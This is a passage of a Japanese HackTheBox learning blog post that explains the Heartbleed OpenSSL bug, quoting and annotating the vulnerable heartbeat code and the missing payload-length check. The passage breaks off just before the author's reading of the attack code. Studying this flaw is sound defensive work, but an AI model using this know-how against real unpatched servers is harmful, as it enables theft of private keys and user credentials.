{"componentChunkName":"component---src-templates-post-template-js","path":"/hackthebox-linux-valentine","result":{"data":{"markdownRemark":{"id":"96993e86-3a20-5f34-9e9d-69e1481c4459","html":"<p>趣味で「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。\n「Hack The Box」のランクは、本記事執筆時点でProHackerです。</p>\n<img src=\"http://www.hackthebox.eu/badge/image/327080\" alt=\"Hack The Box\">\n<p>この記事では、HackTheBoxのマシン攻略を通して「Heartbleed(CVE-2014-0160)」に対する攻撃と、セキュリティ向上のための対処方法について勉強したことをまとめていきます。</p>\n<p>今回攻略するマシン「Valentine」は、僕がHackTheBoxで初めて攻略したマシンです。\n当時は何もわからない状態でWriteUpを見ながら解いたのですが、「Heartbleed(CVE-2014-0160)」の悪用について全く理解しないまま進めてしまったのがずっと心残りでした。</p>\n<p>そのため、今回は「Heartbleed(CVE-2014-0160)」の悪用についてちゃんと理解したいと思い、この記事を書きました。</p>\n<!-- omit in toc -->\n<h2 id=\"本記事について\" style=\"position:relative;\"><a href=\"#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\" aria-label=\"本記事について permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>本記事について</h2>\n<p><strong>本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。</strong></p>\n<p>自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。</p>\n<p>またすべての発言は所属団体ではなく個人に帰属します。</p>\n<!-- omit in toc -->\n<h2 id=\"もくじ\" style=\"position:relative;\"><a href=\"#%E3%82%82%E3%81%8F%E3%81%98\" aria-label=\"もくじ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>もくじ</h2>\n<ul>\n<li>\n<p><a href=\"#heartbleedcve-2014-0160-%E3%81%A8%E3%81%AF\">Heartbleed(CVE-2014-0160) とは</a></p>\n<ul>\n<li><a href=\"#%E6%97%A5%E6%9C%AC%E5%9B%BD%E5%86%85%E3%81%A7%E3%82%82%E5%A4%9A%E3%81%8F%E3%81%AE%E6%94%BB%E6%92%83%E3%82%92%E8%A6%B3%E6%B8%AC\">日本国内でも多くの攻撃を観測</a></li>\n<li><a href=\"#heartbleed%E3%81%AE%E3%83%A1%E3%82%AB%E3%83%8B%E3%82%BA%E3%83%A0\">Heartbleedのメカニズム</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#openssl%E3%81%AE%E5%95%8F%E9%A1%8C%E3%81%AE%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E8%AA%AD%E3%82%93%E3%81%A7%E3%81%BF%E3%82%8B\">OpenSSLの問題のコードを読んでみる</a></p>\n<ul>\n<li><a href=\"#1-%E5%8F%97%E3%81%91%E5%8F%96%E3%81%A3%E3%81%9F%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E5%85%88%E9%A0%AD1%E3%83%90%E3%82%A4%E3%83%88%E3%82%92hbtype%E3%81%A8%E3%81%97%E3%81%A6%E5%8F%96%E5%BE%97\">1. 受け取ったデータの先頭1バイトをhbtypeとして取得</a></li>\n<li><a href=\"#2-%E5%8F%97%E3%81%91%E5%8F%96%E3%81%A3%E3%81%9F%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E5%85%88%E9%A0%AD2%E3%83%90%E3%82%A4%E3%83%88%E7%9B%AE%E3%81%8B%E3%82%893%E3%83%90%E3%82%A4%E3%83%88%E7%9B%AE%E3%82%92payload%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E9%95%B7%E3%81%A8%E3%81%97%E3%81%A6%E5%8F%96%E5%BE%97\">2. 受け取ったデータの先頭2バイト目から3バイト目をpayload(ペイロード長)として取得</a></li>\n</ul>\n</li>\n<li><a href=\"#hackthebox-valentine-%E3%82%92%E6%94%BB%E7%95%A5%E3%81%99%E3%82%8B\">HackTheBox [Valentine] を攻略する</a></li>\n<li>\n<p><a href=\"#heartbleed-%E3%81%AE%E6%94%BB%E6%92%83%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E8%AA%AD%E3%82%80\">Heartbleed の攻撃コードを読む</a></p>\n<ul>\n<li>\n<p><a href=\"#main%E9%96%A2%E6%95%B0\">main関数</a></p>\n<ul>\n<li><a href=\"#1%E5%BC%95%E6%95%B0%E3%81%AE%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8A\">1．引数の受け取り</a></li>\n<li><a href=\"#2%E5%90%84%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%81%94%E3%81%A8%E3%81%AB%E3%82%B3%E3%83%8D%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E7%A2%BA%E7%AB%8B%E3%81%97create_hello%E9%96%A2%E6%95%B0%E3%82%92%E5%AE%9F%E8%A1%8C\">2．各バージョンごとにコネクションを確立し、create_hello関数を実行</a></li>\n<li><a href=\"#3%E3%81%AA%E3%82%93%E3%82%84%E3%81%8B%E3%82%93%E3%82%84%E5%BF%9C%E7%AD%94%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF\">3．なんやかんや応答チェック</a></li>\n<li><a href=\"#4-exploit%E3%81%AE%E9%80%81%E4%BF%A1\">4. exploitの送信</a></li>\n</ul>\n</li>\n<li><a href=\"#create_hello%E9%96%A2%E6%95%B0\">create_hello関数</a></li>\n<li><a href=\"#recvmsg%E9%96%A2%E6%95%B0\">recvmsg関数</a></li>\n<li><a href=\"#create_hb%E9%96%A2%E6%95%B0\">create_hb関数</a></li>\n</ul>\n</li>\n<li><a href=\"#%E3%81%8A%E3%81%BE%E3%81%91%E8%84%86%E5%BC%B1%E3%81%AAopenssl%E3%82%92%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B\">おまけ：脆弱なOpenSSLをビルドする</a></li>\n<li><a href=\"#%E3%81%8A%E3%81%BE%E3%81%91heartbeat%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%81%A8%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B\">おまけ：Heartbeatリクエストとレスポンスを確認する</a></li>\n<li><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\">まとめ</a></li>\n<li>\n<p><a href=\"#%E5%8F%82%E8%80%83%E6%83%85%E5%A0%B1\">参考情報</a></p>\n<ul>\n<li><a href=\"#book\">BOOK</a></li>\n<li><a href=\"#web\">WEB</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"本記事のテーマ\" style=\"position:relative;\"><a href=\"#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%AE%E3%83%86%E3%83%BC%E3%83%9E\" aria-label=\"本記事のテーマ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>本記事のテーマ</h3>\n<p>今回のテーマは、「Heartbleed(CVE-2014-0160)」の再現を通して、脆弱性の詳細について学ぶことです。\nそのため、純粋なWriteUpではないこと、ご了承ください。</p>\n<h2 id=\"heartbleedcve-2014-0160-とは\" style=\"position:relative;\"><a href=\"#heartbleedcve-2014-0160-%E3%81%A8%E3%81%AF\" aria-label=\"heartbleedcve 2014 0160 とは permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Heartbleed(CVE-2014-0160) とは</h2>\n<p>「Heartbleed」とは、2014年に発覚し、猛威を振るったOpenSSLの脆弱性の名称です。\n当時、脆弱性のあるバージョンのOpenSSLがかなり普及していたこともあり、世界中で実際に多くの被害を出したことで知られています。</p>\n<blockquote>\n<p>ハートブリード（英語: Heartbleed）とは、2014年4月に発覚したオープンソース暗号ライブラリ「OpenSSL」のソフトウェア・バグのことである。当時、信頼された認証局から証明書が発行されているインターネット上のWebサーバの約17％（約50万台）で、この脆弱性が存在するHeartbeat拡張が有効になっており、サーバーの秘密鍵や利用者のセッション・クッキーやパスワードを盗み出すことが出来る可能性があった。</p>\n<p><a href=\"https://ja.wikipedia.org/wiki/%E3%83%8F%E3%83%BC%E3%83%88%E3%83%96%E3%83%AA%E3%83%BC%E3%83%89\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ハートブリード - Wikipedia</a></p>\n</blockquote>\n<h3 id=\"日本国内でも多くの攻撃を観測\" style=\"position:relative;\"><a href=\"#%E6%97%A5%E6%9C%AC%E5%9B%BD%E5%86%85%E3%81%A7%E3%82%82%E5%A4%9A%E3%81%8F%E3%81%AE%E6%94%BB%E6%92%83%E3%82%92%E8%A6%B3%E6%B8%AC\" aria-label=\"日本国内でも多くの攻撃を観測 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>日本国内でも多くの攻撃を観測</h3>\n<ul>\n<li><a href=\"https://www.sbbit.jp/article/cont1/27881\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">三菱UFJニコスも被害を公表　Heartbleedで致命傷を負わないために ｜ビジネス+IT</a></li>\n<li><a href=\"https://enterprisezine.jp/iti/detail/6110\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Heartbleed攻撃は脆弱性公開から1週間で100万件超—日本IBM「2014年上半期 Tokyo SOC情報分析レポート」 (1/2)：EnterpriseZine（エンタープライズジン）</a></li>\n</ul>\n<h3 id=\"heartbleedのメカニズム\" style=\"position:relative;\"><a href=\"#heartbleed%E3%81%AE%E3%83%A1%E3%82%AB%E3%83%8B%E3%82%BA%E3%83%A0\" aria-label=\"heartbleedのメカニズム permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Heartbleedのメカニズム</h3>\n<p>さて、実際に攻撃を実践するためには、Heartbleedの脆弱性がどのように悪用されるのかを知る必要があります。</p>\n<p><strong>Heartbleedは、OpenSSL1.0.1から実装された「heartbeat」という、通信相手が稼働しているかを確認するための機能のバグを悪用する脆弱性です。</strong></p>\n<p>「heartbeat」機能では、SSL通信の疎通確認のため、上限64KBの確認データを送信します。\n確認用データを受信した側は、そのデータをそのまま応答に使用し、確認用データを送信した側が応答を受信することで稼働確認を行います。</p>\n<p>この際問題となるのが、<strong>データを受信した側は確認データのサイズ上限の確認を行わない</strong>ことです。</p>\n<p>このバグによって、<strong>実際に送信しているペイロード長よりも大きな値を設定して送信するとバッファ上のペイロードがないメモリ領域まで読み込んでheartbeatレスポンスで応答する問題</strong>が発生します。</p>\n<p>これを利用することで、サーバ上の情報が意図しない形で抜き出されてしまいます。\nこの脆弱性の怖い点としては、サーバ上の情報（秘密鍵含む）が流出する可能性があるのはもちろんですが、情報漏洩の痕跡が残りにくいことでしょうか。</p>\n<p>ユーザとしては、情報漏洩があったと仮定してパスワードなどの変更くらいしか対処法がなさそうです。</p>\n<h2 id=\"opensslの問題のコードを読んでみる\" style=\"position:relative;\"><a href=\"#openssl%E3%81%AE%E5%95%8F%E9%A1%8C%E3%81%AE%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E8%AA%AD%E3%82%93%E3%81%A7%E3%81%BF%E3%82%8B\" aria-label=\"opensslの問題のコードを読んでみる permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>OpenSSLの問題のコードを読んでみる</h2>\n<p><a href=\"https://www.ipa.go.jp/security/ciadr/vul/20140408-openssl.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OpenSSL の脆弱性対策について(CVE-2014-0160)：IPA 独立行政法人 情報処理推進機構</a>によると、以下のバージョンのOpenSSLがこの脆弱性の影響を受けるようです。</p>\n<ul>\n<li>OpenSSL 1.0.1 から 1.0.1f</li>\n<li>OpenSSL 1.0.2-beta から 1.0.2-beta1</li>\n</ul>\n<p>そのため、<a href=\"https://github.com/openssl/openssl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">openssl/openssl: TLS/SSL and crypto library</a>から、問題のあるコードを読んでみることにしました。</p>\n<p>OpenSSLのリポジトリをcloneした後、<code class=\"language-text\">git checkout refs/tags/OpenSSL_1_0_1f</code>をたたくと、問題のブランチに移動できます。</p>\n<p>取得した古いソースコードから、<code class=\"language-text\">heartbeat</code>という文字列で検索をかけたところ、問題のある関数が見つかりました。</p>\n<p>では、ここからこの問題コードを読んでいきます。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">t</span><span class=\"token expression\"><span class=\"token number\">1</span>_lib<span class=\"token punctuation\">.</span>c</span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">OPENSSL_NO_HEARTBEATS</span></span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">tls1_process_heartbeat</span><span class=\"token punctuation\">(</span>SSL <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>s<span class=\"token operator\">-></span>s3<span class=\"token operator\">-></span>rrec<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>pl<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> hbtype<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> payload<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> padding <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Use minimum padding */</span>\n\n\t<span class=\"token comment\">/* Read type and payload length first */</span>\n    <span class=\"token comment\">// 1. 受け取ったデータの先頭1バイトをhbtypeとして取得</span>\n\thbtype <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">// 2. 受け取ったデータの先頭2バイト目から3バイト目をpayload(ペイロード長)として取得</span>\n\t<span class=\"token function\">n2s</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tpl <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span>\n・・・\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hbtype <span class=\"token operator\">==</span> TLS1_HB_REQUEST<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n        ・・・\n\t\tbuffer <span class=\"token operator\">=</span> <span class=\"token function\">OPENSSL_malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> payload <span class=\"token operator\">+</span> padding<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tbp <span class=\"token operator\">=</span> buffer<span class=\"token punctuation\">;</span>\n\t\t\n\t\t<span class=\"token comment\">/* Enter response type, length and copy payload */</span>\n\t\t<span class=\"token operator\">*</span>bp<span class=\"token operator\">++</span> <span class=\"token operator\">=</span> TLS1_HB_RESPONSE<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">s2n</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> bp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// 3. memcpy 想定しないアドレスの情報まで抜き出してしまう</span>\n\t\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>bp<span class=\"token punctuation\">,</span> pl<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tbp <span class=\"token operator\">+=</span> payload<span class=\"token punctuation\">;</span>\n\n・・・</code></pre></div>\n<p>読みやすいように、コメントをつけておきました。</p>\n<p>まずは次の項目からです。</p>\n<h3 id=\"1-受け取ったデータの先頭1バイトをhbtypeとして取得\" style=\"position:relative;\"><a href=\"#1-%E5%8F%97%E3%81%91%E5%8F%96%E3%81%A3%E3%81%9F%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E5%85%88%E9%A0%AD1%E3%83%90%E3%82%A4%E3%83%88%E3%82%92hbtype%E3%81%A8%E3%81%97%E3%81%A6%E5%8F%96%E5%BE%97\" aria-label=\"1 受け取ったデータの先頭1バイトをhbtypeとして取得 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. 受け取ったデータの先頭1バイトをhbtypeとして取得</h3>\n<p>heartbeatとして送られてきた<strong>データの先頭1バイト目には、そのデータが要求なのか、応答なのかを示す数値が格納されている</strong>ようで、これを取得しています。\n具体的には、ssl_3.hにて定義されていました。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">;</span> ssl_3<span class=\"token punctuation\">.</span>h\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TLS1_HB_REQUEST</span>\t\t<span class=\"token expression\"><span class=\"token number\">1</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TLS1_HB_RESPONSE</span>\t<span class=\"token expression\"><span class=\"token number\">2</span></span></span></code></pre></div>\n<h3 id=\"2-受け取ったデータの先頭2バイト目から3バイト目をpayloadペイロード長として取得\" style=\"position:relative;\"><a href=\"#2-%E5%8F%97%E3%81%91%E5%8F%96%E3%81%A3%E3%81%9F%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E5%85%88%E9%A0%AD2%E3%83%90%E3%82%A4%E3%83%88%E7%9B%AE%E3%81%8B%E3%82%893%E3%83%90%E3%82%A4%E3%83%88%E7%9B%AE%E3%82%92payload%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E9%95%B7%E3%81%A8%E3%81%97%E3%81%A6%E5%8F%96%E5%BE%97\" aria-label=\"2 受け取ったデータの先頭2バイト目から3バイト目をpayloadペイロード長として取得 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. 受け取ったデータの先頭2バイト目から3バイト目をpayload(ペイロード長)として取得</h3>\n<p>次に、受け取ったデータの2バイト目から3バイト目を<code class=\"language-text\">n2s()</code>マクロで取得し、payloadに格納しています。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">n2s</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span>\t<span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> c<span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></span></span></code></pre></div>\n<p>なぜこのようなことをしているのか疑問だったのですが、<strong>受け取ったデータの2バイト目から3バイト目には、payload全体のlengthが格納されている</strong>ようです。\n参考：<a href=\"https://stackabuse.com/heartbleed-bug-explained/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Heartbleed Bug Explained</a></p>\n<p>つまり、ここで取得したpayload長に対するバリデーションが存在しないままmemcpy関数にpayload長を与えてしまうことで、本来想定されていない領域の情報まで応答に含んでしまうようになるというわけです。\n参考：<a href=\"https://www.jpcert.or.jp/sc-rules/c-arr33-c.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ARR33-C. コピーは必ず十分なサイズの記憶領域に対して行われることを保証する</a></p>\n<p>これで、脆弱性のメカニズムの概要はつかめたような気がしますが、最後に疑問が残ります。\n<strong>なぜ、Heartbleedの悪用で一度に得られる情報の最大値が64KBと言われているのでしょうか。</strong></p>\n<p>これは、ペイロード長として使用される枠が2バイトであるためです。\nペイロード長を示すバイト列には、16進数で最大FFFFまでの値を挿入できます。</p>\n<p>2バイト=16bitで表現できるアドレスは64KBまでなので、<strong>Heartbleedの悪用で一度に取得できる情報の最大値も64KB</strong>という話です。</p>\n<h2 id=\"hackthebox-valentine-を攻略する\" style=\"position:relative;\"><a href=\"#hackthebox-valentine-%E3%82%92%E6%94%BB%E7%95%A5%E3%81%99%E3%82%8B\" aria-label=\"hackthebox valentine を攻略する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>HackTheBox [Valentine] を攻略する</h2>\n<p>さて、Heartbleedの概要がつかめたところで、実際にこの脆弱性を悪用して、HackTheBox のEasyマシン、Valentineを攻略していきます。</p>\n<p>とはいえ、今回のテーマはHeartbleedに対する攻撃を再現することですので、攻略手法の大部分は割愛します。\nマシン攻略の詳細は、<a href=\"https://qiita.com/yukitsukai47\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">yukitsukai47</a>さんの<a href=\"https://qiita.com/yukitsukai47/items/e59407abd1e76fa48a24\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Hack The Box[Valentine] -Writeup- - Qiita</a>が分かりやすいのでおすすめです。</p>\n<h2 id=\"heartbleed-の攻撃コードを読む\" style=\"position:relative;\"><a 